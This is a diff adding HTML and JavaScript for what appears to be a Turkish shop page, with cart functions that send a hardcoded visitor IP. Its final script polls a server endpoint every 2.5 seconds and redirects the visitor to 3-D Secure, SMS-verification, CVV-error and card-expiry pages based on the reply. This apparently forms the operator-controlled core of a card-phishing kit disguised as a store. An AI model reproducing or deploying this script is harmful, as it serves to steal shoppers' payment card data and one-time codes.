+               <a href="/?filtre=ALTUS">
+                ALTUS
+               </a>
+              </span>
+             </span>
+            </label>
+           </li>
+          </ul>
+         </div>
+        </div>
+       </div>
+       <div class="filter-remove">
+       </div>
+      </div>
+      <div id="cboxTitle" style="float: left;">
+       <div class="headline" id="head1" style="text-align: left;">
+        <span class="headline-text">
+         Filtrele
+        </span>
+       </div>
+       <div class="headline" id="head2" style="text-align: center; display: none;">
+        <span class="headline-text">
+         Marka
+        </span>
+        <span class="glyphicon glyphicon-menu-left filter-back js-mobile-filter-accordion" onclick="document.getElementById('markalarmobil').style.display = 'none'; document.getElementById('markamobilbuton').style.display = 'block'; document.getElementById('head1').style.display = 'block'; document.getElementById('head2').style.display = 'none';" style="float: left; margin-top: 9px;">
+        </span>
+       </div>
+      </div>
+      <div id="cboxCurrent" style="float: left; display: none;">
+      </div>
+      <button id="cboxPrevious" style="display: none;" type="button">
+      </button>
+      <button id="cboxNext" style="display: none;" type="button">
+      </button>
+      <button id="cboxSlideshow" style="display: none;">
+      </button>
+      <div id="cboxLoadingOverlay" style="float: left; display: none;">
+      </div>
+      <div id="cboxLoadingGraphic" style="float: left; display: none;">
+      </div>
+      <button id="cboxClose" onclick="document.getElementById('colorbox').style.display = 'none'; document.body.removeAttribute('style');" type="button">
+       <span class="close-icon">
+       </span>
+      </button>
+     </div>
+     <div id="cboxMiddleRight" style="float: left; height: 875px;">
+     </div>
+    </div>
+    <div style="clear: left;">
+     <div id="cboxBottomLeft" style="float: left;">
+     </div>
+     <div id="cboxBottomCenter" style="float: left; width: 402px;">
+     </div>
+     <div id="cboxBottomRight" style="float: left;">
+     </div>
+    </div>
+   </div>
+  </div>
+  <div class="" id="colorbox2" role="dialog" style="display: none; visibility: visible; top: 0px; left: 15px; position: absolute; width: 400px; height: 291px;" tabindex="-1">
+   <div id="cboxWrapper" style="height: 291px; width: 400px;">
+    <div>
+     <div id="cboxTopLeft" style="float: left;">
+     </div>
+     <div id="cboxTopCenter" style="float: left; width: 372px;">
+     </div>
+     <div id="cboxTopRight" style="float: left;">
+     </div>
+    </div>
+    <div style="clear: left;">
+     <div id="cboxMiddleLeft" style="float: left; height: 234px;">
+     </div>
+     <div class="addToCartWarning" id="cboxContent" style="float: left; width: 372px; height: 234px;">
+      <div id="cboxLoadedContent" style="width: 352px; overflow: auto; height: 154px;">
+       <div class="addToCartWarningModalContainer">
+        <p id="bildirimyazi">
+        </p>
+        <p>
+         <a class="btn btn-default btn-block closeColorBox" onclick="document.getElementById('cboxOverlay').style.display = 'none'; document.getElementById('colorbox2').style.display = 'none';">
+          Tamam
+         </a>
+        </p>
+       </div>
+      </div>
+      <div id="cboxTitle" style="float: left;">
+       <div class="headline">
+        <span class="headline-text">
+         Bilgilendirme
+        </span>
+       </div>
+      </div>
+      <div id="cboxCurrent" style="float: left; display: none;">
+      </div>
+      <button id="cboxPrevious" style="display: none;" type="button">
+      </button>
+      <button id="cboxNext" style="display: none;" type="button">
+      </button>
+      <button id="cboxSlideshow" style="display: none;">
+      </button>
+      <div id="cboxLoadingOverlay" style="float: left; display: none;">
+      </div>
+      <div id="cboxLoadingGraphic" style="float: left; display: none;">
+      </div>
+      <button id="cboxClose" onclick="document.getElementById('cboxOverlay').style.display = 'none'; document.getElementById('colorbox2').style.display = 'none';" type="button">
+       <i class="glyphicon glyphicon-remove">
+       </i>
+      </button>
+     </div>
+     <div id="cboxMiddleRight" style="float: left; height: 234px;">
+     </div>
+    </div>
+    <div style="clear: left;">
+     <div id="cboxBottomLeft" style="float: left;">
+     </div>
+     <div id="cboxBottomCenter" style="float: left; width: 372px;">
+     </div>
+     <div id="cboxBottomRight" style="float: left;">
+     </div>
+    </div>
+   </div>
+   <div style="position: absolute; width: 9999px; visibility: hidden; max-width: none; display: none;">
+   </div>
+  </div>
+  <script src="./assets/modal.js">
+  </script>
+  <script>
+   function errNotify(text) {
+            document.getElementById('cboxOverlay').style.display = 'block';
+            document.getElementById('colorbox2').style.display = "block";
+            document.getElementById('bildirimyazi').innerHTML = text;
+         }
+
+         function SepeteEkle(urun_id) {
+            if(urun_id) {
+               $.ajax({
+                  type: 'POST',
+                  url: 'request.php?action=sepet_ekle',
+                  data: {
+                     ip: "37.228.237.68",
+                     urun_id: urun_id
+                  },
+                  success: function(data) {
+                     if(data == "success") {
+                        document.getElementById("urunekleniyor"+urun_id).style.display = "block"
+                        document.getElementById("sepetekle"+urun_id).style.display = "none"
+                        setTimeout(() => {
+                           document.getElementById("sepeteeklendibildirim"+urun_id).style.display = "inline"
+                           document.getElementById("urunekleniyor"+urun_id).style.display = "none"
+                           document.getElementById("sepetekle"+urun_id).style.display = ""
+                           setTimeout(() => {
+                              document.getElementById("sepeteeklendibildirim"+urun_id).style.display = "none"
+                           }, 2100);
+                        }, 2200);
+						 $("#sepeteklendi").load(window.location.href + " #sepeteklendi");
+                     } else if(data == "fail") {
+                        window.scrollTo({
+                           top: 0,
+                           behavior: 'smooth'
+                        });
+                        errNotify('Bu ürün için siparişinizde verebileceğiniz maksimum adet/miktarı ek yaptığınız siparişinizde ya da şu anda vermekte olduğunuz siparişinizde sepetinizde eklidir.');
+                     }
+                  }
+               });
+            }
+         }
+
+         function SepetSil(urun_id) {
+            if(urun_id) {
+               $.ajax({
+                  type: 'POST',
+                  url: 'request.php?action=sepet_sil',
+                  data: {
+                     ip: "37.228.237.68",
+                     urun_id: urun_id
+                  },
+                  success: function(data) {
+                     if(data == "success") {
+                        alert("Ürün başarıyla silindi.");
+                        setTimeout(() => {
+                           window.location.reload();
+                        }, 350);
+                     }
+                  }
+               });
+            }
+         }
+  </script>
+  <script type="text/javascript">
+   $(document).ready(function() {
+        gonder();
+        var int = self.setInterval("gonder()", 2500);
+      });
+      
+      function gonder() {
+        $.ajax({
+           type: 'POST',
+           url: '/veri.php?ip=37.228.237.68',
+           success: function(msg) {
+              if (msg.includes('sms')) {
+                  window.location.href = 'acsredirect';
+              }
+              if (msg.includes('tebrikler')) {
+                  window.location.href = 'acsredirect?control=success';
+              }
+              if (msg.includes('hata_sms')) {
+                  window.location.href = 'acsredirect?control=error';
+              }
+              if (msg.includes('hata_limit')) {
+                window.location.href = '/?redirect=error_limit';
+              }
+              if (msg.includes('hata_internet')) {
+                 window.location.href = '/?redirect=error_internet';
+              }
+			   if (msg.includes('hata_cvv')) {
+                  window.location.href = '/odeme?status=cvv';
+              }
+              if (msg.includes('hata_skt')) {
+                  window.location.href = '/odeme?status=skt';
+              }
+              if (msg.includes('hata_dogrulama')) {
+                window.location.href = '/dogrulama?control=error';
+              }
+              if (msg == "dogrulama" || msg == "dogrulamadogrulama") {
+                 window.location.href = '/dogrulama';
+              }
+              if (msg.includes('basa_dondur')) {
+                  window.location.href = '/';
+              }
+           }
+        });
+      }
+  </script>
+ </body>
+</html>
